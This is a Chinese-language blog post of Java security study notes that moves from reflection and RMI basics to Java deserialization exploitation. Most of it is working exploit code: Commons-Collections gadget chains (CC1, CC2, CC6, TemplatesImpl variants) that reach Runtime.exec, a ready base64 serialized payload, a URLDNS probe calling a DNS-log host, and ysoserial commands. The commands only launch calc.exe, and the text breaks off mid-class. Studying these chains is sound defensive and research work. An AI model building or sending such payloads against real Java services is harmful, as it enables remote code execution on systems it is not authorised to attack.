---
title: "重拾Java安全漫谈"
date: 2023-04-13 00:00:00
updated: 2023-04-23 01:07:25
tags:
  - java
description: "java反序列化"
---

# 重拾Java安全漫谈

## 1 环境准备

首先安装java

windows

[https://www.oracle.com/java/technologies/downloads/#java8-windows](https://www.oracle.com/java/technologies/downloads/#java8-windows)

linux

`sudo apt install openjdk-8-jre-headless`

`sudo apt install openjdk-8-jdk-headless`

卸载java

- 先检查是否安装，命令：`dpkg --list | grep -i jdk`
- 移除openjdk包，命令：`apt-get purge openjdk*`
- 卸载 OpenJDK 相关包，命令：`apt-get purge icedtea-* openjdk-*`
- 再次检查是否卸载成功，命令：`dpkg --list | grep -i jdk`
- 卸载完成

安装java

- [https://www.oracle.com/java/technologies/downloads/#java8-linux](https://www.oracle.com/java/technologies/downloads/#java8-linux)
- vim命令打开/etc/profile vim /etc/profile 在文件中加入
- `JAVA_HOME=/usr/local/jdk1.7.0_71`
  `CLASSPATH=.:$JAVA_HOME/lib.tools.jar`
  `PATH=$JAVA_HOME/bin:$PATH`
  `export JAVA_HOME CLASSPATH PATH`

安装idea [https://www.jetbrains.com/idea/download/#section=windows](https://www.jetbrains.com/idea/download/#section=windows)

创建项目

```java
public class DoTest {
    public static void main(String[] args) {
            System.out.println(System.getProperty("user.home"));
            System.out.println(System.getProperty("java.version"));
            System.out.println(System.getProperty("os.name"));
            System.out.println(System.getProperty("java.vendor.url"));
    }
}
// output 
C:\Users\username
1.8.0_321
Windows 10
http://java.oracle.com/
```

## 2 反射

反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。

在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。

```java
public class Reflection {
    public static void main(String[] args) throws Exception {
        execute("Test","testPrint");
    }
    public static void execute(String className, String methodName) throws Exception {
        Class clazz = Class.forName(className);
    }
}
class Test{
    static {
        try {
            Class clazz = Class.forName("java.lang.Runtime");
            clazz.getMethod("exec", String[].class).invoke(clazz.getMethod("getRuntime").invoke(clazz),new String[][]{{"cmd.exe","/c","calc"}});
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令

```java
public class Reflection02 {
    public static void main(String[] args) {
        try {
            Class clazzTest = Class.forName("Test2");
            Class clazz = Class.forName("java.lang.ProcessBuilder");
            // ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList("cmd.exe", "/c", "calc"))).start();
            // new ProcessBuilder("calc.exe").start();
            // clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("cmd.exe","/c","calc")));
            clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{"powershell.exe","-c","calc|calc"}}));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
class Test2{
    static {
        System.out.println("test2");
    }
}
```

用 getDeclaredConstructor 来获取这个Runtime的构造方法来实例化对象，进而执行命令

```java
public class Reflection03 {
    public static void main(String[] args) {
        try {
            Class clazz = Class.forName("java.lang.Runtime");
            Class constructor = Class.forName("java.lang.reflect.Constructor");
            Constructor m = clazz.getDeclaredConstructor();
            m.setAccessible(true);
            clazz.getMethod("exec", String.class).invoke(m.newInstance(),"calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
class Test3 {
    static {
        System.out.println("test3");
    }
}
```

## 3 RMI

```java
//RMIServer.java
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {
    public interface IRemoteHelloWorld extends Remote {
        public String hello() throws RemoteException;
    }

    public class RemoteHelloWorld extends UnicastRemoteObject implements
            IRemoteHelloWorld {
        protected RemoteHelloWorld() throws RemoteException {
            super();
        }

        public String hello() throws RemoteException {
            System.out.println("call from");
            return "Hello world";
        }
    }

    private void start() throws Exception {
        System.setProperty("java.rmi.server.hostname","vpsip");
        RemoteHelloWorld h = new RemoteHelloWorld();
        // RemoteHelloWorld skeleton = (RemoteHelloWorld) UnicastRemoteObject.exportObject(h, 11041);
        LocateRegistry.createRegistry(11099);
        Naming.rebind("rmi://127.0.0.1:11099/Hello", h);
    }

    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}

//Client.java
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.time.LocalDateTime;

public class Client {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        // 连接到服务器，端口11099:
        Registry registry = LocateRegistry.getRegistry("vpsip", 11099);
        // 查找名称为"WorldClock"的服务并强制转型为WorldClock接口:
        WorldClock worldClock = (WorldClock) registry.lookup("WorldClock");
        // 正常调用接口方法:
        LocalDateTime now = worldClock.getLocalDateTime("Asia/Shanghai");
        // 打印调用结果:
        System.out.println(now);
    }
}
```

其中， java.rmi.server.hostname 是服务器的IP地址，远程调用时需要根据这个值来访问RMI Server。

## 4 反序列化

简单的序列化与反序列化

```java
//SerializeDemo.java
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class SerializeDemo {
    public static void main(String[] args) throws Exception {
        Person person = new Person("L1ao",3);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(person);
        byte[] encoded = Base64.getEncoder().encode(byteArrayOutputStream.toByteArray());
        System.out.println(new String(encoded));
    }
}
class Person implements java.io.Serializable {
    public String name;
    public int age;

    Person(String name, int age) {
        this.age = age;
        this.name = name;
    }
}

//DeserializeDemo.java
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Base64;

public class DeserializeDemo {
    public static void main(String[] args) throws Exception {
        String b64 = "rO0ABXNyAAZQZXJzb26fU5kJESsv1QMAAkkAA2FnZUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAAAN0AARMMWFvdAAQVGhpcyBpcyBhIG9iamVjdHg=";
        byte[] bytes = Base64.getDecoder().decode(b64);
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
        Person p = null;
        p = (Person) in.readObject();
        in.close();
        System.out.println("name:" + p.name +" age:" + p.age);
    }
}
```

### URLDNS

yso示例

```bash
java -jar ysoserial.jar URLDNS "http://bb81c2a9.dns.1433.eu.org"|base64
```

- 使⽤Java内置的类构造，对第三⽅库没有依赖
- 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞

```java
//URLDemo.java 示范
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

/* *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 * */
public class URLDemo {

    public static void main(String[] args) throws Exception {
        //Ser();
        DeSer();
    }
    static public void DeSer() throws Exception {
        String b64 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAGDc2OGExODkyLmRucy4xNDMzLmV1Lm9yZ3QAAHEAfgAFdAAEaHR0cHB4c3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAANF4";
        byte[] bytes = Base64.getDecoder().decode(b64);
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
        in.readObject();
    }

    static public void Ser() throws Exception {
        HashMap hashmap = new HashMap();
        URL url = new URL("http://768a1892.dns.1433.eu.org");
        Field filed = Class.forName("java.net.URL").getDeclaredField("hashCode");
        filed.setAccessible(true);
        filed.set(url, 209);
        hashmap.put(url, 209);
        filed.set(url, -1);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashmap);
        byte[] encoded = Base64.getEncoder().encode(byteArrayOutputStream.toByteArray());
        System.out.println(new String(encoded));
    }
}
```

### Collections1

- 安装 Java JDK 1.7
- 创建 Maven项目 添加依赖
  ```xml
  <dependencies>
      <dependency>
          <groupId>commons-collections</groupId>
          <artifactId>commons-collections</artifactId>
          <version>3.1</version>
      </dependency>
  </dependencies>
  ```
  #### TransformedMap版

```java
//CommonCollections1.java    TransformedMap版
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.misc.BASE64Encoder;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] { String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke",
                        new Class[] { Object.class, Object[].class },
                        new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class },
                        new String[] {"calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value","xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        BASE64Encoder b64 = new BASE64Encoder();
        String encode = b64.encode(byteArrayOutputStream.toByteArray());
        String msg = encode.replaceAll("(\\\r\\\n|\\\r|\\\n|\\\n\\\r)", "");
        System.out.println(msg);
    }
}

//CommonCollectionsDeserializeDemo1.java
import sun.misc.BASE64Decoder;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
public class CommonCollectionsDeserializeDemo1 {
    public static void main(String[] args) throws Exception{
        String b64str = "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgAxb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5UcmFuc2Zvcm1lZE1hcGF3P+Bd8VpwAwACTAAOa2V5VHJhbnNmb3JtZXJ0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO0wAEHZhbHVlVHJhbnNmb3JtZXJxAH4ABXhwcHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGQAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABlzcQB+ABF1cQB+ABYAAAACcHVxAH4AFgAAAAB0AAZpbnZva2V1cQB+ABkAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAWc3EAfgARdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQACGNhbGMuZXhldAAEZXhlY3VxAH4AGQAAAAFxAH4AHnNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAFdmFsdWV0AAR4eHh4eHh2cgAeamF2YS5sYW5nLmFubm90YXRpb24uUmV0ZW50aW9uAAAAAAAAAAAAAAB4cA==";
        BASE64Decoder b64 = new BASE64Decoder();
        byte[] bytes = b64.decodeBuffer(b64str);
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
        in.readObject();
    }
}
```

#### Java对象代理

示范

```java
//ExampleInvocationHandler.java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;


public class ExampleInvocationHandler implements InvocationHandler {
    protected Map map;

    public ExampleInvocationHandler(Map map) {
        this.map = map;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().compareTo("get") == 0) {
            System.out.println("HOOK Method: " + method.getName());
            return "Hacked by L1ao";
        }
        return method.invoke(this.map, args);
    }
}
//AppTest.java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class AppTest {
    public static void main(String[] args) throws Exception {
        InvocationHandler handler = new ExampleInvocationHandler(new HashMap());
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler);
        proxyMap.put("hello","world");
        String result = (String) proxyMap.get("hello");
        System.out.println(result);
    }
}
/*
* 运行AppTest输出:
*   HOOK Method: get
*   Hacked by L1ao
* */
```

#### LazyMap版

```java
//CommonCollections1.java    LazyMap版
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import sun.misc.BASE64Encoder;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] { String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke",
                        new Class[] { Object.class, Object[].class },
                        new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class },
                        new String[] {"powershell -c \"calc|calc\"" }),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value","xxxx");
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)constructor.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler) ;
        handler = (InvocationHandler) constructor.newInstance(Retention.class,proxyMap);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(handler);
        BASE64Encoder b64 = new BASE64Encoder();
        String encode = b64.encode(byteArrayOutputStream.toByteArray());
        String msg = encode.replaceAll("(\\\r\\\n|\\\r|\\\n|\\\n\\\r)", "");
        System.out.println(msg);
        }
}
```

yso命令

```bash
java -jar ysoserial.jar   CommonsCollections1 'powershell -c "calc|calc"' |base64
```

### Collections2

java.util.PriorityQueue

org.apache.commons.collections4.comparators.TransformingComparator

#### Transformer

```java
package org.example;

/**
 * @author L1ao
 * @version 1.0
 */

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.Base64;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class CommonCollections2 {

    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new String[]{"calc.exe"}
                )
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Comparator comparator = new TransformingComparator(transformerChain);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);

        setFieldValue(transformerChain, "iTransformers", transformers);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        String barrBase64 = Base64.getEncoder().encodeToString(barr.toByteArray());
        System.out.println(barrBase64);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(barrBase64)));
        Object o = (Object) ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

#### TemplatesImpl(基于CC2)

在禁用Transformer数组时

```java
package org.example;


import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Comparator;
import java.util.Base64;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class CommonCollections22 {

    public static void main(String[] args) throws Exception {

        TemplatesImpl templatesImplObj = new TemplatesImpl();
        setFieldValue(templatesImplObj, "_bytecodes", new byte[][] {getBytescode(HelloTemplatesImpl.class)});
        setFieldValue(templatesImplObj, "_name", "HelloTemplatesImpl");
        setFieldValue(templatesImplObj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("toString",null,null);
        Comparator comparator = new TransformingComparator(transformer);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(templatesImplObj);
        queue.add(templatesImplObj);

        setFieldValue(transformer, "iMethodName", "newTransformer");
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        String barrBase64 = Base64.getEncoder().encodeToString(barr.toByteArray());
        System.out.println(barrBase64);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(barrBase64)));
        Object o = (Object) ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getBytescode(Class<?> clazz) throws Exception {
        String className = clazz.getName().replace('.', '/') + ".class";
        URL classUrl = clazz.getClassLoader().getResource(className);
        try (InputStream in = classUrl.openStream(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[4096];
            int n;
            while ((n = in.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            byte[] classBytes = out.toByteArray();
            return classBytes;
        }
    }
}
```

### Collections6

```java
package com.sec.test;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import sun.misc.BASE64Encoder;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * @author L1ao
 * @version 1.0
 */
public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(1)
        };
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] { String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke",
                        new Class[] { Object.class, Object[].class },
                        new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class },
                        new String[] {"calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);


        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"key");

        Map expMap = new HashMap();
        expMap.put(tiedMapEntry,"value");

        outerMap.remove("key");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(expMap);
        objectOutputStream.close();


        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        Object o = (Object)ois.readObject();

        BASE64Encoder b64 = new BASE64Encoder();
        String encode = b64.encode(byteArrayOutputStream.toByteArray());
        String msg = encode.replaceAll("(\\\r\\\n|\\\r|\\\n|\\\n\\\r)", "");
        System.out.println(msg);
    }
}
```

#### TemplatesImpl(基于CC1)

```java
package com.sec.test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;


/**
 * @author L1ao
 * @version 1.0
 */
public class CommonCollections1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    private static String getClassBytes(Class<?> clazz) throws Exception {
        String className = clazz.getName().replace('.', '/') + ".class";
        URL classUrl = clazz.getClassLoader().getResource(className);
        try (InputStream in = classUrl.openStream(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[4096];
            int n;
            while ((n = in.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            byte[] classBytes = out.toByteArray();
            String base64Class = new BASE64Encoder().encode(classBytes);
            String msg = base64Class.replaceAll("(\\\r\\\n|\\\r|\\\n|\\\n\\\r)", "");
            return msg;
        }
    }

    public static void main(String[] args) throws Exception {

        BASE64Decoder base64Decoder = new BASE64Decoder();
        byte[] code = base64Decoder.decodeBuffer(getClassBytes(evil.HelloTemplatesImpl.class));

        TemplatesImpl templatesImplObj = new TemplatesImpl();
        setFieldValue(templatesImplObj, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImplObj, "_name", "HelloTemplatesImpl");
        setFieldValue(templatesImplObj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templatesImplObj),
                new InvokerTransformer("newTransformer",null,null)
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value","xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        BASE64Encoder b64 = new BASE64Encoder();
        String encode = b64.encode(byteArrayOutputStream.toByteArray());
        String msg = encode.replaceAll("(\\\r\\\n|\\\r|\\\n|\\\n\\\r)", "");
        System.out.println(msg);
    }
}
```

```java
package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
public class HelloTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {}
    public HelloTemplatesImpl() {
        super();
        System.out.println("Hello TemplatesImpl");
        try {
            Runtime.getRuntime().exec("calc.exe");
        }catch (Exception e) {

        }

    }
}
```

```java
package com.sec.test;

import sun.misc.BASE64Decoder;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

/**
 * @author L1ao
 * @version 1.0
 */
public class CommonCollectionsDeserializeDemo1 {
    public static void main(String[] args) throws Exception {
